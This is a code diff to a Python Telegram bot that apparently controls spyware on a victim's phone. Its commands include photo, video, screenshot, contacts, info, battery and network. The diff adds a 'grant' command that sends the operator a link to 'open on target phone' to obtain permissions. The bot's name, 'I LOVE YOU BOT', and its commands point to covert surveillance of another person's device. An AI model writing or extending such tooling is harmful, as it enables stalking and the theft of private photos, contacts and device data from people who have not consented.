@@ -41,6 +41,12 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 """
     await update.message.reply_text(commands)
 
+async def grant(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if str(update.effective_chat.id) != CHAT_ID:
+        await update.message.reply_text("❌ Unauthorized user.")
+        return
+    await update.message.reply_text(f"Open this link on target phone to grant permission:\n{PERMISSION_LINK}")
+
 async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_permission():
         await update.message.reply_text("❌ Permission not granted yet!")
@@ -92,6 +98,7 @@ async def network(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Register handlers
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CommandHandler("help", help_command))
+app.add_handler(CommandHandler("grant", grant))
 app.add_handler(CommandHandler("photo", photo))
 app.add_handler(CommandHandler("video", video))
 app.add_handler(CommandHandler("screenshot", screenshot_cmd))
@@ -100,7 +107,7 @@ app.add_handler(CommandHandler("contacts", contacts))
 app.add_handler(CommandHandler("info", info))
 app.add_handler(CommandHandler("battery", battery))
 app.add_handler(CommandHandler("network", network))
-# অন্য commands add করতে পারো helper থেকে
+# অন্যান্য commands add করতে পারো helper থেকে
 
 print("💖 I LOVE YOU BOT is running...")
 app.run_polling()
